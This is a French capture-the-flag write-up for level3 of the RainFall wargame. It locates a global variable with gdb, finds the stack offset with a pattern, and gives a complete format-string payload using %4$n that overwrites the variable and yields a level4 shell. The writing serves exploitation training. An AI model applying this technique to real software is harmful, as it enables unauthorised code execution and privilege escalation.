## Le programme
Le main appelle une fonction P et on s'apercoit tres vite que si la variable globale 'm' vaut 64 on rentre dans la condition et un shell est lancé. 


## La faille
L'idée est de trouver ou est m 

```(gdb) p &m
$2 = (<data variable, no debug info> *) 0x804988c
```

m se trouve donc à l'adresse 0x804988c.

En testant avec un pattern on se rend compte que le début du buffer (offset=0) se trouve être le 4ème argument (41306141) print dans la stack.

https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

```
level3@RainFall:~$ ./level3 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A %x %x %x %x %x %x %x
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 200 b7fd1ac0 b7ff37d0 41306141 61413161 33614132 41346141

```

Il faudrait pouvoir ecrire l'adresse de m sur la stack au bon endroit


La prochaine etape serait d'ecrire la valeur 64 a la valeur de m

On peut utiliser %n pour ecrire a l'adresse qu'on lui donne le nombre de caractere qu'il a deja ecrit

\x8c\x98\x04\x08Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9%4$n

le %4$n permet d'écrire au 4 ème argument qui est le début du buffer.

## La solution

```
level3@RainFall:~$ printf "\x8c\x98\x04\x08Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9%%4\$n" > /tmp/level3
level3@RainFall:~$ cat /tmp/level3 - | ./level3 
   
�Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
Wait what?!
whoami
level4
```